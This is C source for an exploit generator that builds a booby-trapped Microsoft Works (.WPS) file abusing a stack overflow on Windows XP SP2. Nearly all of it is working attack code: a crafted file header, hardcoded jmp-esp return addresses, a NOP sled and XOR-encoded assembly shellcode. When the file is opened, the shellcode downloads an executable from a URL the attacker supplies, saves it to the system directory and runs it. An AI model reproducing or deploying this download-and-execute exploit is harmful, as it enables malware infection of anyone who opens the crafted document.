#include <stdio.h>
#include <winsock2.h>
#include <windows.h>


#pragma comment(lib, "ws2_32")

#define NOPS "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// Use for find the ASM code
#define PROC_BEGIN        __asm _emit 0x90 __asm _emit 0x90\
                          __asm _emit 0x90 __asm _emit 0x90\
                          __asm _emit 0x90 __asm _emit 0x90\
                          __asm _emit 0x90 __asm _emit 0x90
#define PROC_END          PROC_BEGIN
#define SEARCH_STR        "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define SEARCH_LEN        8
#define MAX_SC_LEN        2048
#define HASH_KEY          13

// Define Decode Parameter
#define DECODE_LEN        21
#define SC_LEN_OFFSET     7
#define ENC_KEY_OFFSET    11
#define ENC_KEY           0x99


// Define Function Addr
#define ADDR_LoadLibraryA          [esi]
#define ADDR_GetSystemDirectoryA   [esi+4]
#define ADDR_WinExec               [esi+8]
#define ADDR_ExitProcess           [esi+12]
#define ADDR_URLDownloadToFileA    [esi+16]
//#define ADDR_URL               edi

// Need functions
unsigned char functions[100][128] =      
{                             // [esi] stack layout
  // kernel32 4                   // 00 kernel32.dll
  {"LoadLibraryA"},               //   [esi]
  {"GetTempPathA"},        //   [esi+4]{"GetSystemDirectoryA"}
  {"WinExec"},                    //   [esi+8]    
  {"ExitProcess"},                //   [esi+12]
  //("ExitThread"},
  //{"TerminateProcess"},
  // urlmon 1                   // 01 urlmon.dll
  {"URLDownloadToFileA"},          //   [esi+16]
  {""},
};

/* WPS Header */
unsigned char uszWpsHeader[] =
"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x09\x00"
"\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x02\x00\x00\x00"
"\x01\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xfd\xff\xff\xff\xfe\xff\xff\xff\xfe\xff\xff\xff\x04\x00\x00\x00"
"\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00"
"\xfe\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x52\x00\x6f\x00\x6f\x00\x74\x00\x20\x00\x45\x00\x6e\x00\x74\x00"
"\x72\x00\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x16\x00\x05\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00"
"\xb2\x5a\xa4\x0e\x0a\x9e\xd1\x11\xa4\x07\x00\xc0\x4f\xb9\x32\xba"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x10\xb9\x5f"
"\x53\x8f\xc7\x01\x03\x00\x00\x00\xc0\x0a\x00\x00\x00\x00\x00\x00"
"\x43\x00\x4f\x00\x4e\x00\x54\x00\x45\x00\x4e\x00\x54\x00\x53\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x01\x02\x00\x00\x00\x03\x00\x00\x00\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00"
"\x01\x00\x43\x00\x6f\x00\x6d\x00\x70\x00\x4f\x00\x62\x00\x6a\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x28\x00\x00\x00\x56\x00\x00\x00\x00\x00\x00\x00"
"\x53\x00\x50\x00\x45\x00\x4c\x00\x4c\x00\x49\x00\x4e\x00\x47\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x2a\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00"
"\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00"
"\x09\x00\x00\x00\x0a\x00\x00\x00\x0b\x00\x00\x00\x0c\x00\x00\x00"
"\x0d\x00\x00\x00\x0e\x00\x00\x00\x0f\x00\x00\x00\x10\x00\x00\x00"
"\x11\x00\x00\x00\x12\x00\x00\x00\x13\x00\x00\x00\x14\x00\x00\x00"
"\x15\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\x18\x00\x00\x00"
"\x19\x00\x00\x00\x1a\x00\x00\x00\x1b\x00\x00\x00\x1c\x00\x00\x00"
"\x1d\x00\x00\x00\x1e\x00\x00\x00\x1f\x00\x00\x00\x20\x00\x00\x00"
"\x21\x00\x00\x00\x22\x00\x00\x00\x23\x00\x00\x00\x24\x00\x00\x00"
"\x25\x00\x00\x00\x26\x00\x00\x00\x27\x00\x00\x00\xfe\xff\xff\xff"
"\x29\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x43\x48\x4e\x4b\x57\x4b\x53\x20\x04\x00\x08\x00\x0e\x00\x00\x03"
"\x00\x02\x00\x00\x00\x0a\x00\x00\xf8\x01\x0e\x00\xff\xff\xff\xff"
"\x18\x00\x54\x45\x58\x54\x00\x00\x2f\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char szIntro[] =
"[+] Targets:\n"
"\t(1) Windows XP SP2 ntdll.dll DE jmpesp\n"
"\t(2) Windows XP SP2 ntdll.dll CN&TW jmpesp\n"
"Usage: wps.exe <target> <file> <URL>\n"
".Ex:wps.exe 2 test.wps http://www.0x520.cn/test.exe\n";

struct {
        const char *szTarget;
        unsigned char uszRet[5];
}targets[] = {
        {"Windows XP SP2 DE ntdll.dll jmpesp", "\xED\x1E\x94\x7C"},/* jmp esp */
        {"Windows XP SP2 CN&TW ntdll.dll jmpesp","\xED\x1E\x96\x7C"},
};
// Shellcode string
unsigned char sc[1024] = {0};

unsigned char url[256]={0};

// ASM shellcode main function
void   ShellCode();

// Get function hash
static DWORD __stdcall GetHash ( char *c )
{
  DWORD h = 0;
  
  while ( *c )
  {
    __asm ror h, HASH_KEY
    
    h += *c++;
  }
  return( h );
}

void Make_ShellCode()
{
  unsigned char  *pSc_addr;
  unsigned int   Sc_len;
  unsigned int   Enc_key=ENC_KEY;
  unsigned long  dwHash[100];
  unsigned int   dwHashSize;

  int i,j,k,l;
  
  
  // Get functions hash
  //printf("[+] Get functions hash strings.\r\n");
  for (i=0;;i++)
  {
    if (functions[i][0] == '\x0') break;
    dwHash[i] = GetHash((char*)functions[i]);
    //printf("\t%.8X\t%s\n", dwHash[i], functions[i]);
  }
  dwHashSize = i*4;


  // Deal with shellcode
  pSc_addr = (unsigned char *)ShellCode;
  
  for (k=0;k<MAX_SC_LEN;++k )
  {
    if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0)
    {
        break;
    }
  }
  pSc_addr+=(k+SEARCH_LEN);           // Start of the ShellCode
  
  for (k=0;k<MAX_SC_LEN;++k)
  {
    if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) {
        break;
    }
  }
  Sc_len=k;                           // Length of the ShellCode
  
  memcpy(sc, pSc_addr, Sc_len);       // Copy shellcode to sc[]


  // Add functions hash
  memcpy(sc+Sc_len, (char *)dwHash, dwHashSize);
  Sc_len += dwHashSize;

  // Add url
  memcpy(sc+Sc_len, url, strlen(url)+1);  
  Sc_len += strlen(url)+1;

  // Print the size of shellcode.
  //printf("[+] %d + %d + %d = %d bytes shellcode\n", DECODE_LEN, Sc_len-DECODE_LEN-sizeof(url)+1, sizeof(url)-1, Sc_len);
  // Print shellcode
  //PrintSc(sc, Sc_len);
  

  // Deal with find the right XOR byte
  for(i=0xff; i>0; i--)
  {
    l = 0;
    for(j=DECODE_LEN; j<(int)Sc_len; j++)
    {
        if (
            ((sc[j] ^ i) == 0x26) || //%
            ((sc[j] ^ i) == 0x3d) || //=
            ((sc[j] ^ i) == 0x3f) || //?
            ((sc[j] ^ i) == 0x40) || //@
            ((sc[j] ^ i) == 0x00) ||
            ((sc[j] ^ i) == 0x0D) ||
            ((sc[j] ^ i) == 0x0A)
          )                   // Define Bad Characters
        {
          l++;                 // If found the right XOR byte£¬l equals 0
          break;
        };
    }
  
    if (l==0)
    {
        Enc_key = i;
        
        //printf("[+] Find XOR Byte: 0x%02X\n", i);
        for(j=DECODE_LEN; j<(int)Sc_len; j++)
        {
          sc[j] ^= Enc_key;
        }

        break;                 // If found the right XOR byte, Break
    }
  }

  // Deal with not found XOR byte
  if (l!=0)
  {
    printf("[-] No xor byte found!\r\n");
    exit(-1);
  }

  // Deal with DeCode string
  *(unsigned char *)&sc[SC_LEN_OFFSET] = Sc_len;
  *(unsigned char *)&sc[ENC_KEY_OFFSET] = Enc_key;

  // Print decode
  //printf("/* %d bytes decode */\r\n", DECODE_LEN);
  //PrintSc(sc, DECODE_LEN);

  // Print shellcode
  //printf("/* %d bytes shellcode, xor with 0x%02x */\r\n", Sc_len-DECODE_LEN, Enc_key);
  //PrintSc((char*)sc+DECODE_LEN, Sc_len-DECODE_LEN);
}

int main( int argc, char **argv ) {
WSADATA wsa;
  FILE *f;
char szBuffer[1024*10];
WSAStartup(MAKEWORD(2,2),&wsa);

printf("\n\t\tMicrosoft Office .WPS Stack Overflow\n"
         "\t\t\tAdam Walker (c) 2007\n"
"\t\t\tModified by Mika[EST]\n\n");
if ( argc < 4 ) {
          printf("%s\n", szIntro );
          return 0;
  }
memcpy(url,argv[3],strlen(argv[3]));
   printf("[+] download url:%s\n", url);
   printf("[+] Generating Shellcode...\n");
  
  Make_ShellCode();
  memset(szBuffer, 0x90, 1024*10);
  printf("[+] Creating WPS header...\n");
  memcpy( szBuffer, uszWpsHeader, sizeof( uszWpsHeader ) - 1 );
  printf("[+] Copying addr && nops && shellcode...\n");
  memcpy( szBuffer + sizeof( uszWpsHeader ) - 1, targets[atoi(argv[1])-1].uszRet, 4 );
  memcpy(szBuffer + sizeof( uszWpsHeader ) + 3,NOPS,16);
  memcpy( szBuffer + sizeof( uszWpsHeader ) + 3+16, sc, sizeof( sc ) - 1 );
  
  f = fopen( argv[2], "wb" );
  if ( f == NULL ) {
          printf("[-] Cannot create file\n");
          return 0;
  }
  
  fwrite( szBuffer, 1, sizeof( szBuffer) , f );
  fclose( f );
        printf("[+] .WPS file succesfully created!\n");
        printf("[+]Mika is telling you:don't play with fire!^_^\n");
  return 0;
}

// ShellCode function
void ShellCode()
{
  __asm
  {
    PROC_BEGIN                 // C macro to begin proc
//--------------------------------------------------------------------
//
// DeCode
//
//--------------------------------------------------------------------
    jmp   short decode_end
    
decode_start:
    pop   ebx                 // Decode start addr (esp -> ebx)
    dec   ebx
    xor   ecx,ecx
    mov   cl,0xFF               // Decode len
    
  decode_loop:
    xor   byte ptr [ebx+ecx],0x99   // Decode key
    loop   decode_loop
    jmp   short decode_ok

decode_end:
    call   decode_start
    
decode_ok:

//--------------------------------------------------------------------
//
// ShellCode
//
//--------------------------------------------------------------------
    jmp   sc_end
    
sc_start:      
    pop   edi                 // Hash string start addr (esp -> edi)

    // Get kernel32.dll base addr
    mov   eax, fs:0x30           // PEB
    mov   eax, [eax+0x0c]         // PROCESS_MODULE_INFO
    mov   esi, [eax+0x1c]         // InInitOrder.flink
    lodsd                     // eax = InInitOrder.blink
    mov   ebp, [eax+8]           // ebp = kernel32.dll base address

    mov   esi, edi             // Hash string start addr -> esi
  
    // Get function addr of kernel32
    push   4
    pop   ecx
    
  getkernel32:
    call   GetProcAddress_fun
    loop   getkernel32

    // Get function addr of urlmon  
    push   0x00006e6f
    push   0x6d6c7275           // urlmon
    push   esp
    call   ADDR_LoadLibraryA       // LoadLibraryA("urlmon");
    
    mov   ebp, eax             // ebp = urlmon.dll base address
    
/*
    push   1
    pop   ecx

  geturlmon:
    call   GetProcAddress_fun
    loop   geturlmon
*/
    call   GetProcAddress_fun

    // url start addr = edi
    
//LGetSystemDirectoryA:
    sub   esp, 0x300
    mov   ebx, esp
    
    push   ebx
    push   0x300
    call   ADDR_GetSystemDirectoryA   // GetSystemDirectoryA
    
//LURLDownloadToFileA:  
    // eax = system path size
    // URLDownloadToFileA url save to a.exe
    mov   dword ptr [ebx+eax], 0x7261725C       // "\a.e"
    mov   dword ptr [ebx+eax+0x4], 0x6578652E     // "xe"
    xor   eax, eax
    push   eax
    push   eax
    push   ebx                 // %systemdir%\a.exe
    push   edi                 // url
    push   eax
    call   ADDR_URLDownloadToFileA   // URLDownloadToFileA
    
//LWinExec:
           mov   ebx, esp
           push   eax
           push   ebx
           call   ADDR_WinExec           // WinExec(%systemdir%\a.exe);

Finished:
    //push   1
    call   ADDR_ExitProcess         // ExitProcess();

GetProcAddress_fun:  
    push   ecx
    push   esi
  
    mov   esi, [ebp+0x3C]         // e_lfanew
    mov   esi, [esi+ebp+0x78]       // ExportDirectory RVA
    add   esi, ebp             // rva2va
    push   esi
    mov   esi, [esi+0x20]         // AddressOfNames RVA
    add   esi, ebp             // rva2va
    xor   ecx, ecx
    dec   ecx

  find_start:
    inc   ecx
    lodsd
    add   eax, ebp
    xor   ebx, ebx
    
  hash_loop:
    movsx   edx, byte ptr [eax]
    cmp   dl, dh
    jz     short find_addr
    ror   ebx, HASH_KEY           // hash key
    add   ebx, edx
    inc   eax
    jmp   short hash_loop
  
  find_addr:
    cmp   ebx, [edi]             // compare to hash
    jnz   short find_start
    pop   esi                 // ExportDirectory
    mov   ebx, [esi+0x24]         // AddressOfNameOrdinals RVA
    add   ebx, ebp             // rva2va
    mov   cx, [ebx+ecx*2]         // FunctionOrdinal
    mov   ebx, [esi+0x1C]         // AddressOfFunctions RVA
    add   ebx, ebp             // rva2va
    mov   eax, [ebx+ecx*4]         // FunctionAddress RVA
    add   eax, ebp             // rva2va
    stosd                     // function address save to [edi]
    
    pop   esi
    pop   ecx
    ret
    
sc_end:
    call sc_start
    
    PROC_END                   //C macro to end proc
  }
}